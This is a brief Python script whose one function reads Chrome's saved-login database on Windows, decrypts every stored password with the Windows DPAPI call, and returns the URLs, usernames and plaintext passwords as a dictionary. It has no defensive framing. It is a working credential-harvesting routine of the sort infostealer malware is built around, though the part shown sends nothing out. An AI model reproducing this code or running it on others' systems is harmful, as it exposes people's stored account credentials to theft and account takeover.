import os
import sqlite3
import win32crypt
import webbrowser

def passwordsRecovery():
    #|
    #| passwordsRecovery()
    #| return dictonary with Chrome passwords
    #|
    i = 0
    passwords  = {}
    db_path    = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'
    if os.path.exists(db_path):    
        conn   = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            url      = result[0]
            login    = result[1]
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            if password != '':
                i += 1
                passwords[i] = {'url': url, 'login': login, 'password': password}
        return passwords
    else:
        return False